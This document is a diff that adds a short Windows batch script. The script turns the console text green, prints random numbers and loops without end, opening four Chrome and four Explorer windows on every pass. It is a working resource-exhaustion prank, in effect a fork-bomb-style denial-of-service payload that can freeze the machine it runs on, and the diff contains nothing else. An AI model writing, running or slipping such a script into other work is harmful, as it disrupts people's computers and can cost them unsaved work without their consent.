@@ -1,0 +1,13 @@
+@echo off
+color 02
+:start
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+start chrome
+start chrome
+start chrome
+start chrome
+start explorer
+start explorer
+start explorer
+start explorer
+goto start
